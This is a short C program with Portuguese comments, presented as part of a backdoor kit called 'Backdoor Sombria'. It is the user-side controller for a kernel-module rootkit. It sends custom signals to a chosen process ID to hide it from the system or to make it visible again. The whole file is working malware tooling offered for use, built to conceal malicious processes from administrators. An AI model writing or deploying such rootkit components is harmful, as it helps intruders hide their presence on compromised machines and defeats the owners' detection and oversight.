/* PROGRAMA EXECUTOR USADO EM CONJUNTO COM LKM PARA
   ESCONDER PROCESSOS EM EXECUCAO VIA PID.
   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
   nashleon@yahoo.com.br
   THAKS UNSEKURITY TEAM.
   http://unsekurity.cyberpunk.com.br/
   http://unsekurity.virtualave.net/
   Segue aqui como parte da Backdoor Sombria.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>

#define OCULTA    29
#define DESOCULTA 30

void uso(char *nome);

void uso(char *nome){
system("clear");
printf("************************** NL - ESCONDE v1.0 **************************\n");
printf("\nUso: %s PID <on|off>\n\n",nome);
printf("Onde:\n");
printf("PID -> Eh o numero do processo que voce quer esconder.\n");
printf("on  -> Esconde o processo.\n");
printf("off -> Torna o processo escondido ao seu estado normal.\n\n");
exit(0);
}

int main(int argc, char *argv[]){
if(argc < 3){
uso(argv[0]);
}
if(!strcmp(argv[2],"on")){
kill(atoi(argv[1]), OCULTA);
return 0;
}
if(!strcmp(argv[2],"off")){
kill(atoi(argv[1]), DESOCULTA);
return 0;
}
fprintf(stderr,"Erro: Check a Sintaxe e o PID corretamente.\n");
return 0;
}
